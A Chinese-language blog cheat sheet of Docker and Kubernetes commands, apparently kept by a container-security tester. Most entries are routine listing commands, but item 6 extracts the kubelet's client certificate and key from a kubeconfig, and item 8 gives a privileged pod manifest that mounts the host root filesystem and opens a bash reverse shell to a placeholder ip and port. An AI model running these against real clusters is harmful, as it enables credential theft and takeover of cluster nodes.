---
title: docker and k8s常用命令备忘
authors: Enokiy
date: 2024-06-30
categories: [容器安全]
tags: [k8s]
---

## docker常用命令备忘

1. docker快手命令：查找并进入容器：

```bash
#!/bin/bash
cid=docker ps -a |grep $1|grep -v Exit|awk '{print $1}'|sed -n 1p
echo "$cid"
if test -n "$cid"
then
    docker exec -ti -u root $cid bash
else
    echo "$1 not found!!!!"
fi
```

2. 宿主机上查找特权容器：

```bash
docker ps --quiet -a|xargs docker inspect --format="\{\{.Id}}\{\{.Name}}\{\{.HostConfig.Privileged}}"|grep true
```

## k8s 常用命令备忘

1. 查看k8s所有资源，包括自定义资源：

```shell
kubectl api-resources
```
2. 只获取EXTERNAL_IP包含100.的pod结果

```bash
kubectl get pods -A -o custom-columns=NAME:.metadata.name,NAMESPACE:.metadata.namespace,NODENAME:.spec.nodeName,HOSTIP:.status.hostIP
kubectl get svc -A -o wide|awk '{if (index($5,"100.")) print $0}' 
```
3. 不配kubeconfig文件，通过证书认证

```bash
kubectl --client-certificate=/var/cert/server.cer --client-key=/var/cert/server_key.pem --certificate-authority=/var/cert/ca.cer -s https://192.168.16.4:4443
```

4. 获取所有pod的name，namespace，nodeName，Host IP命令

```bash
kubectl get pods --all-namespaces -o custom-columns=NAME:.metadata.name,NAMESPACE:.metadata.namespace,NODENAME:.spec.nodeName,HOSTIP:.status.hostIP
```

5. 遍历获取所有namespace下面的pods

```bash
for ns in `kubectl get ns -o custom-columns=NAME:.metadata.name --no-headers` ; do kubectl get  pods -n "$ns" -o custom-columns=NAME:.metadata.name,NAMESPACE:.metadata.namespace,NODENAME:.spec.nodeName,HOSTIP:.status.hostIP;done >all_pods.txt

kubectl get pods -A -o custom-columns=NAME:.metadata.name,NAMESPACE:.metadata.namespace,NODENAME:.spec.nodeName,HOSTIP:.status.hostIP;done >all_pods.txt
```

5. 遍历获取所有namespace下面的svc

```bash
for ns in `kubectl get ns -o custom-columns=NAME:.metadata.name|grep -v NAME` ; do kubectl get  svc -n "$ns" -o custom-columns=NAMESPACE:.metadata.namespace,NAME:.metadata.name,TYPE:.spec.type,CLUSTER-IP:.spec.clusterIP,PORTS:.spec.ports;done >all_svc.txt

kubectl get svc -A -o custom-columns=NAMESPACE:.metadata.namespace,NAME:.metadata.name,TYPE:.spec.type,CLUSTER-IP:.spec.clusterIP,PORTS:.spec.ports >all_svc.txt

kubectl get svc -A -o jsonpath='{range .items[*]}{.metadata.namespace}{"\t"}{.metadata.name}{"\t"}{.spec.type}{"\t"}{.spec.clusterIP}{"\t"}{range .spec.ports[*]}{.protocol}{"/"}{.port}{","}{end}{"\n"}{end}'>all_svc.txt
```

6. 从kubeconfig文件提取crt和key

```bash
cat /opt/kube-agent/kubernetes/kubelet/kubeconfig| grep client-certificate-data | cut -f2 -d : | tr -d ' ' | base64 -d >kubelet.crt
cat /opt/kube-agent/kubernetes/kubelet/kubeconfig| grep client-key-data| cut -f2 -d : | tr -d ' ' | base64 -d >kubelet.key
```

7. 查看所有clusterrole以及其权限

```bash
for cr in `kubectl get clusterrole -o custom-columns=NAME:.metadata.name|grep -v NAME`;do echo "kubectl describe clusterrole $cr";kubectl describe clusterrole $cr;done
```
8. 通过创建pod 反弹shell并提权到node节点上

```yaml
apiVersion: v1
kind: Pod
metadata:
    name: pod1
spec:
    containers:
    - image: nginx
    name: pod1
    command: ['/bin/bash','-c','bash -i >&/dev/tcp/ip/port 0>&1'] 
    securityContext:
        privileged: true
        runAsUser: 0
        runAsgroup: 0
    volumeMounts:
    - name: hostfs
        mountPath: /hostfs
    volumes:
    - name: hostfs
    hostPath:
        path: "/"
```